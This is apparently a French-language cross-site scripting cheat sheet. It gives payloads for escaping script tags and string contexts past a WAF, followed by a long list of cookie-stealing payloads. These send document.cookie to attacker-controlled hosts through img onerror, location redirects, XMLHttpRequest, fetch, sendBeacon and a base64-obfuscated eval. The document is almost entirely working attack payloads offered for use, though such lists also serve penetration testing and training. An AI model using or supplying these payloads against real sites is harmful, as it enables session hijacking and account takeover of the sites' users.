`</script><img src=1 onerror=alert(document.domain)>` : Pour échapper d'un tag . Si le waf nous empeche de mettre des <>, on peut faire

```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
';alert(document.domain);var prout='
```

---

payload pour récupérer les cookie :

```
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>

<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">

<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>

<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>

<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>

<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>

<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>

<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>

<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>

<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>

<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>

<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>

<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```

